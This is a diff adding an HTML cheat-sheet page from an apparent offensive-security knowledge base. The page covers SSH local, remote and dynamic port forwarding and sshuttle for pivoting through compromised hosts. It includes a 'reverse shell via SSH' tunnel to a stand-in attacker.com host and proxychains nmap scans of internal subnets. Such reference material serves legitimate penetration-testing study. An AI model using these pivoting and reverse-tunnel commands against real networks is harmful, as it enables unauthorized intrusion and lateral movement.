@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSH Tunneling | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-medium { background: rgba(255,200,0,0.2); color: #ffc800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Network</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Network</a> / SSH Tunneling
+    </div>
+    <div class="page-header">
+      <span class="severity-badge severity-medium"><i class="fas fa-key"></i> Lateral Movement | T1570</span>
+      <h1>🔑 SSH Tunneling & Port Forwarding</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1570</span></div>
+        <div class="meta-item"><strong>Protocol</strong><span>SSH</span></div>
+        <div class="meta-item"><strong>Port</strong><span>22</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy</span></div>
+      </div>
+    </div>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>SSH tunneling creates encrypted tunnels for forwarding network traffic, enabling pivoting through compromised hosts and accessing internal services through encrypted channels.</p>
+    </div>
+    <div class="content-section" id="local">
+      <h2>🔀 Local Port Forwarding</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Forward local port 8080 to remote service via jump host
+ssh -L 8080:internal-host:80 user@jump-server.com
+
+# Forward local port 3389 to internal RDP
+ssh -L 3389:internal-pc:3389 user@jump-server.com
+
+# Multiple forwards
+ssh -L 8080:webserver:80 -L 443:webserver:443 -L 3389:rdp-host:3389 user@jump.com
+
+# With key
+ssh -L 8080:target:80 -i key.pem user@jump.com</pre>
+      </div>
+    </div>
+    <div class="content-section" id="remote">
+      <h2>🔄 Remote Port Forwarding</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Forward remote port 9090 to local service
+ssh -R 9090:localhost:8080 user@vps-server.com
+
+# Bind to all interfaces
+ssh -R 0.0.0.0:9090:localhost:8080 user@vps.com
+
+# Reverse shell via SSH
+ssh -R 4444:127.0.0.1:4444 user@attacker.com
+
+# Proxy pivoting
+ssh -R 1080:127.0.0.1:1080 user@proxy-server.com</pre>
+      </div>
+    </div>
+    <div class="content-section" id="dynamic">
+      <h2>🌐 Dynamic SOCKS Proxy</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create SOCKS5 proxy on port 1080
+ssh -D 1080 user@jump-server.com
+
+# Configure browser to use 127.0.0.1:1080 as SOCKS proxy
+# All traffic through SSH tunnel
+
+# With proxychains
+# Add to /etc/proxychains4.conf
+# socks5 127.0.0.1 1080
+
+# Use with tools
+proxychains nmap -sT 10.10.10.0/24
+proxychains firefox</pre>
+      </div>
+    </div>
+    <div class="content-section" id="sshuttle">
+      <h2>🛠️ SSHuttle (Full Tunnel)</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Route all traffic through SSH
+sshuttle -r user@jump-server.com 10.0.0.0/8
+
+# Exclude specific subnet
+sshuttle -r user@jump.com 10.0.0.0/8 -x 10.10.10.50
+
+# DNS forwarding
+sshuttle -r user@jump.com 0/0 --dns
+
+# As daemon
+sshuttle -r user@jump.com 10.0.0.0/8 -D</pre>
+      </div>
+    </div>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://www.ssh.com/academy/ssh/tunneling-example" target="_blank">SSH Tunneling Guide</a></li>
+        <li><a href="https://github.com/sshuttle/sshuttle" target="_blank">SSHuttle</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Network</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
